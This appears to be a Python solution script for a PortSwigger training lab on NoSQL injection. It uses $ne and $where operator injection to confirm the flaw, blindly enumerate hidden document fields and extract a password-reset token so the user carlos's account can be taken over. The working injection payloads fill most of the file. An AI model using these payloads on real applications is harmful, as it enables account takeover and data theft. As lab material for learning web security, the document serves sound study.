"""
Lab 4: Exploiting NoSQL operator injection to extract unknown fields
https://portswigger.net/web-security/nosql-injection/lab-nosql-injection-extract-unknown-fields
Difficulty: Practitioner

📝 First confirm $ne injection (this locks the account — you'll need to
manually trigger a password reset for carlos via the lab's browser BEFORE
relying on login afterward, per PortSwigger's own documented solution).
Then use $where: Object.keys(this)[N] to enumerate field NAMES you don't
already know exist (commonly turns up a password-reset token field),
extract its value character-by-character, and use it to reset carlos's
password yourself.
"""

import string

from utils import get_session, where_clause_probe, log, note

TARGET = "https://YOUR-LAB-ID.web-security-academy.net"
LOGIN_PATH = "/login"
CHARSET = string.ascii_lowercase + string.digits + "-"


def run():
    s = get_session()

    note("Step 1: confirm $ne injection works (expect 'Account locked', not")
    note("'Invalid username or password' — this IS the confirmation signal,")
    note("even though it also means direct login is now blocked).")
    r = where_clause_probe(s, f"{TARGET}{LOGIN_PATH}", "carlos", "1==1",
                            password_filter={"$ne": "invalid"})
    log(f"Response: {r.text[:200]}")

    note("⚠️ IMPORTANT (per PortSwigger's own documented gotcha): now go")
    note("manually trigger a password reset for carlos via the lab's embedded")
    note("browser (Forgot password -> submit 'carlos') BEFORE continuing —")
    note("this creates the reset-token field on his document for us to find.")
    input("Press Enter once you've triggered the reset in the browser...")

    note("Step 2: enumerate field names via Object.keys(this).")
    field_names = []
    for i in range(10):
        found = ""
        for pos in range(30):
            found_char = None
            for c in CHARSET:
                candidate = found + c
                where_expr = f"Object.keys(this)[{i}] && Object.keys(this)[{i}].match('^{candidate}.*')"
                r = where_clause_probe(s, f"{TARGET}{LOGIN_PATH}", "carlos", where_expr,
                                        password_filter={"$ne": "invalid"})
                if "lock" in r.text.lower():
                    found_char = c
                    break
            if found_char is None:
                break
            found += found_char
        if not found:
            break
        field_names.append(found)
        log(f"Field {i}: {found!r}")

    log(f"All enumerated fields: {field_names}")
    note("Look for anything token/reset-related among the fields (commonly")
    note("something like 'resettoken' or similar) alongside the expected")
    note("_id/username/password/email — that's the target for Step 3.")

    note("Step 3: once identified, extract that field's VALUE the same way")
    note("as Lab 3's character-by-character approach, substituting")
    note("`this.<fieldname>[pos] == 'c'` for the $where expression.")

    note("Step 4: use the extracted token against the password-reset")
    note("submission endpoint (?temp-forgot-password-token=<token>) to set")
    note("a new password for carlos, then log in normally.")


if __name__ == "__main__":
    run()
